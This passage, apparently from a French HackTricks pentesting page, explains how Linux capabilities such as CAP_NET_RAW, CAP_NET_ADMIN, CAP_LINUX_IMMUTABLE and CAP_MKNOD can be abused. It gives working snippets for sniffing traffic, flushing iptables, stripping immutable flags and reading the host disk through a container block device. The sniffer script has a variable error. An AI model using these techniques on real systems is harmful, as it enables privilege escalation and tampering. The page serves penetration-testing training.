**Cela signifie qu'il est possible d'intercepter le trafic.** Vous ne pouvez pas escalader directement les privilèges avec cette capacité.

**Exemple avec un binaire**

Si le binaire **`tcpdump`** possède cette capacité, vous pourrez l'utiliser pour capturer des informations réseau.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Notez que si l'**environnement** offre cette capacité, vous pourriez également utiliser **`tcpdump`** pour intercepter le trafic.

**Exemple avec le binaire 2**

L'exemple suivant est un code **`python2`** qui peut être utile pour intercepter le trafic de l'interface "**lo**" (**localhost**). Le code provient du laboratoire "_The Basics: CAP-NET\_BIND + NET\_RAW_" de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

La capacité [**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) confère au titulaire le pouvoir de **modifier les configurations réseau**, y compris les paramètres du pare-feu, les tables de routage, les autorisations de socket et les paramètres d'interface réseau dans les espaces de noms réseau exposés. Elle permet également d'activer le **mode promiscuous** sur les interfaces réseau, permettant ainsi de renifler les paquets à travers les espaces de noms.

**Exemple avec un binaire**

Supposons que le binaire **python** ait ces capacités.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Cela signifie qu'il est possible de modifier les attributs d'inode.** Vous ne pouvez pas escalader les privilèges directement avec cette capacité.

**Exemple avec un binaire**

Si vous constatez qu'un fichier est immuable et que Python a cette capacité, vous pouvez **supprimer l'attribut immuable et rendre le fichier modifiable :**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Notez que généralement, cet attribut immuable est défini et supprimé en utilisant :
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet l'exécution de l'appel système `chroot(2)`, ce qui peut potentiellement permettre l'évasion des environnements `chroot(2)` à travers des vulnérabilités connues :

* [Comment s'échapper de différentes solutions chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t : outil d'évasion chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet non seulement l'exécution de l'appel système `reboot(2)` pour redémarrer le système, y compris des commandes spécifiques comme `LINUX_REBOOT_CMD_RESTART2` adaptées à certaines plateformes matérielles, mais il permet également l'utilisation de `kexec_load(2)` et, à partir de Linux 3.17, `kexec_file_load(2)` pour charger de nouveaux noyaux de crash signés respectivement.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) a été séparé du plus large **CAP_SYS_ADMIN** dans Linux 2.6.37, accordant spécifiquement la capacité d'utiliser l'appel `syslog(2)`. Cette capacité permet de visualiser les adresses du noyau via `/proc` et des interfaces similaires lorsque le paramètre `kptr_restrict` est à 1, contrôlant l'exposition des adresses du noyau. Depuis Linux 2.6.39, la valeur par défaut pour `kptr_restrict` est 0, ce qui signifie que les adresses du noyau sont exposées, bien que de nombreuses distributions définissent ceci à 1 (masquer les adresses sauf pour uid 0) ou 2 (toujours masquer les adresses) pour des raisons de sécurité.

De plus, **CAP_SYSLOG** permet d'accéder à la sortie `dmesg` lorsque `dmesg_restrict` est défini sur 1. Malgré ces changements, **CAP_SYS_ADMIN** conserve la capacité d'effectuer des opérations `syslog` en raison de précédents historiques.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) étend la fonctionnalité de l'appel système `mknod` au-delà de la création de fichiers réguliers, de FIFOs (tuyaux nommés) ou de sockets de domaine UNIX. Il permet spécifiquement la création de fichiers spéciaux, qui incluent :

- **S_IFCHR** : Fichiers spéciaux de caractères, qui sont des périphériques comme les terminaux.
- **S_IFBLK** : Fichiers spéciaux de blocs, qui sont des périphériques comme les disques.

Cette capacité est essentielle pour les processus qui nécessitent la capacité de créer des fichiers de périphériques, facilitant l'interaction directe avec le matériel via des périphériques de caractères ou de blocs.

Il s'agit d'une capacité par défaut de Docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Cette capacité permet des élévations de privilèges (via une lecture complète du disque) sur l'hôte, dans ces conditions :

1. Avoir un accès initial à l'hôte (non privilégié).
2. Avoir un accès initial au conteneur (privilégié (EUID 0), et capacité `CAP_MKNOD` effective).
3. L'hôte et le conteneur doivent partager le même espace de noms utilisateur.

**Étapes pour Créer et Accéder à un Périphérique de Bloc dans un Conteneur :**

1. **Sur l'Hôte en tant qu'Utilisateur Standard :**
- Déterminez votre ID utilisateur actuel avec `id`, par exemple, `uid=1000(utilisateurstandard)`.
- Identifiez le périphérique cible, par exemple, `/dev/sdb`.

2. **À l'Intérieur du Conteneur en tant que `root` :**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **De retour sur l'hôte :**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
### CAP\_SETPCAP

**CAP_SETPCAP** permet à un processus de **modifier les ensembles de capacités** d'un autre processus, permettant l'ajout ou la suppression de capacités des ensembles effectifs, héritables et autorisés. Cependant, un processus ne peut modifier que les capacités qu'il possède dans son propre ensemble autorisé, garantissant qu'il ne peut pas élever les privilèges d'un autre processus au-delà des siens. Les mises à jour récentes du noyau ont renforcé ces règles, restreignant `CAP_SETPCAP` pour ne diminuer que les capacités dans son propre ensemble autorisé ou celui de ses descendants, visant à atténuer les risques de sécurité. L'utilisation nécessite d'avoir `CAP_SETPCAP` dans l'ensemble effectif et les capacités cibles dans l'ensemble autorisé, en utilisant `capset()` pour les modifications. Cela résume la fonction principale et les limitations de `CAP_SETPCAP`, mettant en évidence son rôle dans la gestion des privilèges et l'amélioration de la sécurité.

**`CAP_SETPCAP`** est une capacité Linux qui permet à un processus de **modifier les ensembles de capacités d'un autre processus**. Il accorde la possibilité d'ajouter ou de supprimer des capacités des ensembles de capacités effectifs, héritables et autorisés d'autres processus. Cependant, il existe certaines restrictions quant à l'utilisation de cette capacité.

Un processus avec `CAP_SETPCAP` **ne peut accorder ou supprimer que les capacités présentes dans son propre ensemble de capacités autorisées**. En d'autres termes, un processus ne peut pas accorder une capacité à un autre processus s'il ne possède pas cette capacité lui-même. Cette restriction empêche un processus d'élever les privilèges d'un autre processus au-delà de son propre niveau de privilège.

De plus, dans les versions récentes du noyau, la capacité `CAP_SETPCAP` a été **encore plus restreinte**. Elle ne permet plus à un processus de modifier arbitrairement les ensembles de capacités d'autres processus. Au lieu de cela, elle **autorise uniquement un processus à réduire les capacités dans son propre ensemble de capacités autorisées ou dans l'ensemble de capacités autorisées de ses descendants**. Ce changement a été introduit pour réduire les risques potentiels de sécurité associés à la capacité.

Pour utiliser `CAP_SETPCAP` de manière efficace, vous devez avoir la capacité dans votre ensemble de capacités effectives et les capacités cibles dans votre ensemble de capacités autorisées. Vous pouvez ensuite utiliser l'appel système `capset()` pour modifier les ensembles de capacités d'autres processus.

En résumé, `CAP_SETPCAP` permet à un processus de modifier les ensembles de capacités d'autres processus, mais il ne peut pas accorder des capacités qu'il ne possède pas lui-même. De plus, en raison de préoccupations de sécurité, sa fonctionnalité a été limitée dans les versions récentes du noyau pour permettre uniquement de réduire les capacités dans son propre ensemble de capacités autorisées ou dans les ensembles de capacités autorisées de ses descendants.

## Références

**La plupart de ces exemples ont été tirés de certains laboratoires de** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), donc si vous souhaitez pratiquer ces techniques de privilège, je recommande ces laboratoires.

**Autres références**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) est l'événement le plus pertinent en matière de cybersécurité en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
